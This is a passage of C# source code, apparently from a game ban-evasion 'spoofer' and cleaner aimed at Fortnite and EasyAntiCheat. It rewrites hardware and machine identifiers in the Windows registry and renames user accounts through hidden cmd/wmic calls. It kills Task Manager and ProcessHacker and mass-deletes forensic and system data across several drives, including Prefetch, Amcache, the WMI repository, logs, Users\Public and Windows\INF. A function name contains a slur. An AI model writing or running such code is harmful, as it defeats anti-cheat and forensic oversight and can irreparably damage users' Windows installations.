            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4d36e965-e325-11ce-bfc1-08002be10318}\\Configuration\\Variables\\BusDeviceDesc", "PropertyGuid", Convert.ToString(Guid.NewGuid()));
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\Configuration\\Variables\\DeviceDesc", "PropertyGuid", Convert.ToString(Guid.NewGuid()));
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\Configuration\\Variables\\Driver", "PropertyGuid", Convert.ToString(Guid.NewGuid()));
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\WMI\\Autologger\\AppModel", "GUID", Convert.ToString(Guid.NewGuid()));
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\SYSTEM\\HardwareConfig", "LastConfig", Convert.ToString(Guid.NewGuid()));
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\IDConfigDB\\Hardware Profiles\\0001", "HwProfileGuid", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\HardwareConfig\\{b30417c0-53bd-11e5-8727-305a3ae502fe}", "SystemFamily", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\HardwareConfig\\{b30417c0-53bd-11e5-8727-305a3ae502fe}", "BaseBoardProduct", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\HardwareConfig", "LastConfig", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\0", "Identifier", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\1", "Identifier", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\MediaPlayer\\Preferences\\DMR", "SerialNumber", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\MediaPlayer\\Preferences\\DMR", "UDN", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows Media\\WMSDK\\General", "UniqueID", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\SQMClient", "MachineId", "{" + Guid.NewGuid().ToString() + "}");
            string lol = Environment.UserName;
            string text6 = lol + random.Next(10000, 99999);
            Process pa = new Process();
            pa.StartInfo.RedirectStandardInput = true;
            pa.StartInfo.RedirectStandardError = true;
            pa.StartInfo.RedirectStandardOutput = true;
            pa.StartInfo.UseShellExecute = false;
            pa.StartInfo.CreateNoWindow = true;
            pa.StartInfo.FileName = @"cmd.exe";
            pa.StartInfo.Arguments = "-R C:\\";
            pa.Start();
            Thread.Sleep(30);
            pa.StandardInput.WriteLine("/c wmic useraccount where caption='" + text6 + "' rename " + text6);
            Thread.Sleep(120);
            pa.Kill();
            pa.Close();
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName", "ComputerName", text6);
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", "ComputerName", text6);
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters", "NV Hostname", text6);
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters", "Hostname", text6);
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "RegisteredOwner", text6);
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "RegisteredOrganization", text6);
        }

        public static void FeggotCleaner()
        {
            try
            {
                System.Diagnostics.Process[] prs = System.Diagnostics.Process.GetProcesses();


                foreach (System.Diagnostics.Process pr in prs)
                {
                    if (pr.ProcessName == "Taskmgr")
                    {

                        pr.Kill();

                    }
                }
            }
            catch
            {
            }

            try
            {
                System.Diagnostics.Process[] prs = System.Diagnostics.Process.GetProcesses();


                foreach (System.Diagnostics.Process pr in prs)
                {
                    if (pr.ProcessName == "ProcessHacker")
                    {

                        pr.Kill();

                    }
                }
            }
            catch
            {
            }
            try
            {
                System.Diagnostics.Process[] prs = System.Diagnostics.Process.GetProcesses();


                foreach (System.Diagnostics.Process pr in prs)
                {
                    if (pr.ProcessName == "EpicGamesLauncher")
                    {

                        pr.Kill();

                    }
                }
            }
            catch
            {
            }
            try
            {
                System.Diagnostics.Process[] prs = System.Diagnostics.Process.GetProcesses();


                foreach (System.Diagnostics.Process pr in prs)
                {
                    if (pr.ProcessName == "FolderChangesView")
                    {

                        pr.Kill();

                    }
                }
            }
            catch
            {
            }
            Thread.Sleep(2000);
            string Username = Environment.UserName;

            try
            {
                if (File.Exists("C:\\Windows\\System32\\eac_usermode_21537346703536.dll"))
                {
                    File.Delete("C:\\Windows\\System32\\eac_usermode_21537346703536.dll");
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive"))
                {
                    Directory.Delete("C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive", true);
                }
            }
            catch
            {
            }




            try
            {
                if (File.Exists("C:\\Windows\\appcompact\\Programs\\Amcache.hve"))
                {
                    File.Delete("C:\\Windows\\appcompact\\Programs\\Amcache.hve");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("C:\\Windows\\System32\\LogFiles\\WMI\\EtwRTGraphicsPerfMonitorSession.etl"))
                {
                    File.Delete("C:\\Windows\\System32\\LogFiles\\WMI\\EtwRTGraphicsPerfMonitorSession.etl");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("C:\\Windows\\System\\config\\BBI.LOG2"))
                {
                    File.Delete("C:\\Windows\\System\\config\\BBI.LOG2");
                }
            }
            catch
            {
            }

            if (Directory.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngine"))
            {
                try
                {
                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngine", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }
            }
            if (Directory.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngineLauncher"))
            {
                try
                {
                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngineLauncher", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }
            }
            if (Directory.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher"))
            {
                try
                {

                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }
            }
            if (Directory.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame"))
            {
                try
                {
                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }

            }
            try
            {
                if (Directory.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\NVIDIA Corporation"))
                {
                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\NVIDIA Corporation", true);
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\Speech Graphics"))
                {
                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Speech Graphics", true);
                }
            }
            catch
            {
            }

            if (Directory.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\Packages"))
            {
                try
                {
                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Packages", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }

            }
            try
            {
                if (File.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\AMD\\DxCache"))
                {
                    File.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\AMD\\DxCache");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk"))
                {
                    File.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\INetCache"))
                {
                    File.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\INetCache");
                }
            }
            catch
            {
            }

            if (Directory.Exists("C:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent"))
            {
                try
                {
                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }

            }
            if (Directory.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\Notifications"))
            {
                try
                {
                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\Notifications", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }

            }
            try
            {


                if (Directory.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache"))
                {
                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache", true);
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("C:\\Users\\" + Username + "\\AppData\\Roaming\\EasyAntiCheat"))
                {
                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Roaming\\EasyAntiCheat", true);
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("C:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore"))
                {
                    Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore", true);
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds"))
                {
                    File.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("C:\\Program Files\\Epic Games\\Fortnite.lysEB"))
                {
                    File.Delete("C:\\Program Files\\Epic Games\\Fortnite.lysEB");
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir"))
                {
                    Directory.Delete("C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir", true);
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("C:\\Program Files\\Epic Games\\Fortnite\\EAAC0DED42EADD813C76C2B26C315591"))
                {
                    File.Delete("C:\\Program Files\\Epic Games\\Fortnite\\EAAC0DED42EADD813C76C2B26C315591");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local"))
                {
                    File.Delete("C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("C:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\current"))
                {
                    File.Delete("C:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\current");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("C:\\ProgramData\\Epic\\UnrealEngineLauncher\\LauncherInstalled.dat"))
                {
                    File.Delete("C:\\ProgramData\\Epic\\UnrealEngineLauncher\\LauncherInstalled.dat");
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("C:\\MSOCache"))
                {
                    Directory.Delete("C:\\MSOCache", true);
                }
            }
            catch
            {
            }
            try
            {

                if (File.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav"))
                {
                    File.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav");
                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Local\\Temp\\1CF4.tmp");
                }
            }
            catch
            {
            }


            try
            {
                {
                    File.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Local\\Temp\\1CF4.tmp\\1CF5.bat");

                }
            }
            catch
            {
            }
            try
            {


                {
                    File.Delete("C:Windows\\System32\\spp\\store\\2.0\\data.dat");

                }
            }
            catch
            {
            }



            try
            {

                Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\INetCache\\", true);

            }
            catch
            {

            }


            try
            {
                {
                    Directory.Delete("C:\\Users\\Public", true);

                }
            }
            catch
            {
            }
            try
            {
                Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngine", true);

            }
            catch
            {
            }
            try
            {
                Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher", true);

            }
            catch
            {
            }
            try
            {
                Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame", true);

            }
            catch
            {
            }
            try
            {
                Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds", true);

            }
            catch
            {
            }
            try
            {
                File.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds");
            }
            catch
            {
            }
            try
            {
                File.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\OneDrive\\settings\\Personal\\logUploaderSettings_temp.ini");
            }
            catch
            {
            }
            try
            {
                File.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\OneDrive\\settings\\Personal\\logUploaderSettings.ini");
            }
            catch
            {
            }
            try
            {
                File.Delete("C:\\desktop.ini");

            }
            catch
            {
            }
            try
            {
                File.Delete("C:\\ProgramData\\Microsoft\\Diagnosis\\parse.dat");

            }
            catch
            {
            }
            try
            {
                File.Delete("C:\\Users\\" + Username + "\\ntuser.dat.LOG2");

            }
            catch
            {
            }
            try
            {

                File.Delete("C:\\Users\\" + Username + "\\ntuser.dat.LOG1");

            }
            catch
            {
            }

            try
            {


                {
                    File.Delete("C:\\Users\\" + Username + "\\ntuser.dat.LOG1");

                }
            }
            catch
            {
            }
            try
            {



                File.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\Settings\\settings.dat.LOG2");


            }
            catch
            {
            }

            string[] List = Directory.GetFiles("C:\\Users", @"desktop.ini");
            foreach (string files in List)
            {
                File.Delete(files);
            }
            try
            {



                File.Delete("C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Windows\\qwavecache.dat");


            }
            catch
            {
            }
            try
            {



                File.Delete("C:\\Windows\\System32\\wbem\\Performance\\WmiApRpl.ini");


            }
            catch
            {
            }
            try
            {



                File.Delete("C:\\Windows\\System32\\PerfStringBackup.TMP");


            }
            catch
            {
            }
            try
            {



                File.Delete("C:\\Windows\\System32\\PerfStringBackup.INI");


            }
            catch
            {
            }
            try
            {



                File.Delete("C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA");


            }
            catch
            {
            }
            try
            {



                File.Delete("C:\\Windows\\System32\\wbem\\Repository\\INDEX.BTR");


            }
            catch
            {
            }
            try
            {



                File.Delete("C:\\Windows\\System32\\wbem\\Repository\\MAPPING2.MAP");


            }
            catch
            {
            }

            try
            {



                Directory.Delete("C:\\Windows\\Prefetch", true);


            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("C:\\Windows\\temp\\MpCmdRun.log", true);

                }
            }
            catch
            {
            }
            try
            {



                Directory.Delete("C:\\Windows\\Prefetch", true);



            }
            catch
            {
            }
            try
            {



                Directory.Delete("C:\\Windows\\System32\\sru", true);


            }
            catch
            {
            }
            try
            {



                Directory.Delete("C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir", true);


            }
            catch
            {
            }
            try
            {



                Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC", true);


            }
            catch
            {
            }
            try
            {



                File.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC");


            }
            catch
            {
            }

            try
            {



                Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\History\\History.IE5", true);


            }
            catch
            {
            }
            try
            {



                Directory.Delete("C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache", true);


            }
            catch
            {
            }
            try
            {



                Directory.Delete("C:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\NetworksCache", true);


            }
            catch
            {
            }
            try
            {



                Directory.Delete("C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache", true);


            }
            catch
            {
            }
            try
            {



                Directory.Delete("C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCookies", true);


            }
            catch
            {
            }
            try
            {



                Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\remotemetastore", true);


            }
            catch
            {
            }
            try
            {



                Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore", true);

            }
            catch
            {
            }
            try
            {



                Directory.Delete("C:\\Windows\\INF", true);

            }
            catch
            {
            }
            try
            {



                File.Delete("C:\\Windows\\INF");

            }
            catch
            {
            }
            try
            {



                Directory.Delete("C:\\Users\\" + Username + "\\AppData\\Local\\NVIDIA Corporation", true);

            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("C:\\Windows\\Logs\\CBS", true);
                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("C:\\Windows\\Logs", true);
                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("C:\\Windows\\SoftwareDistribution\\DataStore\\Logs", true);
                }
            }
            catch
            {
            }

            try
            {
                if (File.Exists("D:\\Windows\\System32\\eac_usermode_21537346703536.dll"))
                {
                    File.Delete("D:\\Windows\\System32\\eac_usermode_21537346703536.dll");
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("D:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive"))
                {
                    Directory.Delete("D:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive", true);
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("D:\\Windows\\appcompact\\Programs\\Amcache.hve"))
                {
                    File.Delete("D:\\Windows\\appcompact\\Programs\\Amcache.hve");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("D:\\Windows\\System32\\LogFiles\\WMI\\EtwRTGraphicsPerfMonitorSession.etl"))
                {
                    File.Delete("D:\\Windows\\System32\\LogFiles\\WMI\\EtwRTGraphicsPerfMonitorSession.etl");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("D:\\Windows\\System\\config\\BBI.LOG2"))
                {
                    File.Delete("D:\\Windows\\System\\config\\BBI.LOG2");
                }
            }
            catch
            {
            }

            if (Directory.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngine"))
            {
                try
                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngine", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }
            }
            if (Directory.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngineLauncher"))
            {
                try
                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngineLauncher", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }
            }
            if (Directory.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher"))
            {
                try
                {

                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\EpicGamesLauncher", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }
            }
            if (Directory.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame"))
            {
                try
                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }

            }
            try
            {
                if (Directory.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\NVIDIA Corporation"))
                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\NVIDIA Corporation", true);
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\Speech Graphics"))
                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Speech Graphics", true);
                }
            }
            catch
            {
            }

            if (Directory.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\Packages"))
            {
                try
                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Packages", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }

            }
            try
            {
                if (File.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\AMD\\DxCache"))
                {
                    File.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\AMD\\DxCache");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk"))
                {
                    File.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\INetCache"))
                {
                    File.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\INetCache");
                }
            }
            catch
            {
            }

            if (Directory.Exists("D:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent"))
            {
                try
                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }

            }
            if (Directory.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\Notifications"))
            {
                try
                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\Notifications", true);
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;

                }

            }
            try
            {


                if (Directory.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache"))
                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache", true);
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("D:\\Users\\" + Username + "\\AppData\\Roaming\\EasyAntiCheat"))
                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Roaming\\EasyAntiCheat", true);
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("D:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore"))
                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore", true);
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds"))
                {
                    File.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("D:\\Program Files\\Epic Games\\Fortnite.lysEB"))
                {
                    File.Delete("D:\\Program Files\\Epic Games\\Fortnite.lysEB");
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir"))
                {
                    Directory.Delete("D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir", true);
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("D:\\Program Files\\Epic Games\\Fortnite\\EAAC0DED42EADD813C76C2B26C315591"))
                {
                    File.Delete("D:\\Program Files\\Epic Games\\Fortnite\\EAAC0DED42EADD813C76C2B26C315591");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local"))
                {
                    File.Delete("D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("D:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\current"))
                {
                    File.Delete("D:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\current");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("D:\\ProgramData\\Epic\\UnrealEngineLauncher\\LauncherInstalled.dat"))
                {
                    File.Delete("D:\\ProgramData\\Epic\\UnrealEngineLauncher\\LauncherInstalled.dat");
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("D:\\MSOCache"))
                {
                    Directory.Delete("D:\\MSOCache", true);
                }
            }
            catch
            {
            }
            try
            {

                if (File.Exists("D:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav"))
                {
                    File.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav");
                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Local\\Temp\\1CF4.tmp");
                }
            }
            catch
            {
            }





            try
            {
                {
                    File.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Local\\Temp\\1CF4.tmp\\1CF5.bat");

                }
            }
            catch
            {
            }
            try
            {


                {
                    File.Delete("C:Windows\\System32\\spp\\store\\2.0\\data.dat");

                }
            }
            catch
            {
            }



            try
            {


                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Windows\\INetCache\\", true);

                }
            }
            catch
            {

            }









            try
            {
                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Origin", true);

                }
            }
            catch
            {
            }
            try
            {

                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Origin", true);

                }
            }
            catch
            {
            }


            try
            {
                {
                    Directory.Delete("D:\\Users\\Public", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds", true);

                }
            }
            catch
            {
            }
            try
            {
                {
                    File.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Microsoft\\Feeds");

                }
            }
            catch
            {
            }
            try
            {


                {
                    File.Delete("D:\\Users\\" + Username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\TransportSecurity~RF244a582.TMP");

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("D:\\Windows\\temp\\w1053", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("D:\\Windows\\temp\\MpCmdRun.log", true);

                }
            }
            catch
            {
            }
            try
            {


                {
                    Directory.Delete("D:\\Windows\\Prefetch", true);

                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("E:\\Windows\\System32\\eac_usermode_21537346703536.dll"))
                {
                    File.Delete("E:\\Windows\\System32\\eac_usermode_21537346703536.dll");
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("E:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive"))
                {
                    Directory.Delete("E:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive", true);
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("E:\\Windows\\appcompact\\Programs\\Amcache.hve"))
                {
                    File.Delete("E:\\Windows\\appcompact\\Programs\\Amcache.hve");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("E:\\Windows\\System32\\LogFiles\\WMI\\EtwRTGraphicsPerfMonitorSession.etl"))
                {
                    File.Delete("E:\\Windows\\System32\\LogFiles\\WMI\\EtwRTGraphicsPerfMonitorSession.etl");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("E:\\Windows\\System\\config\\BBI.LOG2"))
                {
